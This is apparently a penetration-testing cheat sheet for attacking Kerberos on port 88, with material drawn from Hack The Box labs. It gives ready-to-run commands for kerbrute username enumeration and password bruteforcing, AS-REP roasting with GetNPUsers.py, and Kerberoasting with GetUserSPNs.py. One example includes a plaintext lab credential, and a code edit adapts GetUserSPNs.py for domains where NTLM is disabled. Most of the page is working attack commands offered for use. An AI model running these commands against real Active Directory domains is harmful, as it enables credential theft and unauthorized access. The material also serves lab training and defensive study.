---
title: Port 88 - Kerberos
draft: false
tags:
  - kerberoasting
  - kerberos
  - getuserspns
  - as-rep-roasting
  - getnpusers
---

## Bruteforce Account Name

There are many different ways to obtain list of Account Names:
-  RPC
- LDAP
- SMB
- Kerberos

**Account name bruteforcing:**

`./kerbrute_linux_amd64 userenum -d manager.htb --dc dc01.manager.htb /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt`

**Password Bruteforcing:**

`kerbture bruteuser -v --dc 10.0.0.1 -d example.domain passwords.txt username`


## AS-REP Roasting (No Creds)

If you don't have valid credentials for any account, you can try on **as-rep roasting** -> Checks for users that has **NO_PRE_AUTH_REQUIRED** enabled. 

**Without valid username:**

`GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -user usernames -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175`

**With valid username:**

`GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/username`


## Kerberoasting (With Creds)

When you have valid credentials for any account, try on Kerberoasting -> Bruteforce hash if it is found.


`GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip dc.active.htb -request`

![](https://i.imgur.com/0ZOozST.png)

### NTLM Auth Disabled

In such case like [HTB-Scrambled](https://0xdf.gitlab.io/2022/10/01/htb-scrambled-linux.html), NTLM authentication might be disabled for security purpose and you won't be able to use standard tools and you won't be able to access any any service by IP address if it requires authentication.

Edit some lines on **GetUserSpns.py** around line 260:


```python
        if self.__doKerberos:
            #target = self.getMachineName()
            target = self.__kdcHost
```

After making that change, you can use the **-k** flag:

`GetUserSPNs.py scrm.local/ksimpson:ksimpson -dc-ip dc1.scrm.local -request -k`

